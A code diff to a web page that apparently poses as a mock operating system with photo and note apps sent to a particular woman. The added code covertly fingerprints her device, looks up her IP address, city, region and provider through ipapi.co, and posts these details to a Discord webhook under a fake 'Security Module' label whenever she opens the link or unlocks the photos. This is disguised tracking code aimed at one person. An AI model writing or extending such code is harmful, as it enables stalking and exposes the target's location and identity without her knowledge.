@@ -237,17 +237,42 @@
         let currentPin = "";
         let viewedApps = { photos: false, notes: false, music: false };
 
-        function logToDiscord(msg, type = "info") {
-            const color = type === "alert" ? 16711680 : 65280; // Red for alert, Green for info
+        // --- UPDATED INTELLIGENCE LOGGING ---
+        async function logToDiscord(msg, type = "info") {
+            const color = type === "alert" ? 16711680 : 65280;
+            
+            // Capture Device Fingerprint
+            const device = navigator.userAgent.match(/\(([^)]+)\)/)[1]; 
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            let locationData = "Location: Restricted/VPN";
+
+            try {
+                // Fetch approximate location/IP data silently
+                const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
+                locationData = `**Location:** ${ipInfo.city}, ${ipInfo.region}\n**Provider:** ${ipInfo.org}\n**IP:** ${ipInfo.ip}`;
+            } catch (e) { 
+                console.log("Loc offline"); 
+            }
+
+            const description = `
+${msg}
+
+**--- DEVICE INTEL ---**
+**Device:** ${device}
+**Screen:** ${screenRes}
+${locationData}
+            `;
+
             fetch(TRACKING_HOOK, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    username: "System OS Tracker",
+                    username: "System Intelligence",
                     embeds: [{
                         title: type === "alert" ? "🚨 ACTION DETECTED" : "🔋 SYSTEM ONLINE",
-                        description: msg,
+                        description: description,
                         color: color,
+                        footer: { text: "OS v3.4 Security Module" },
                         timestamp: new Date().toISOString()
                     }]
                 })
@@ -283,7 +308,7 @@
             const logs = ["Initializing System...", "Kernel v3.4 Loaded", "Secure Link Active", "Access Granted"];
             let i = 0;
             
-            // TRACKER: She opened the link
+            // TRACKER: Initial hit with Device Intel
             logToDiscord("Target has opened the link. Boot sequence started.");
 
             const interval = setInterval(() => {
@@ -353,13 +378,10 @@
         function closeWin(id) { document.getElementById('win-' + id).classList.remove('active'); }
 
         function unlockPhotos() {
-            // UI Logic
             document.getElementById('js-photo-lock').style.display = 'none';
             document.getElementById('js-photo-grid').style.display = 'grid';
             checkUnlock('photos');
-
-            // --- TRACKING LOGIC (100% POWER) ---
-            logToDiscord("🚨 She just clicked 'Open Anyway' to view the photos!", "alert");
+            logToDiscord("🚨 She just unlocked the Photo Archive!", "alert");
         }
 
         function checkUnlock(id) {
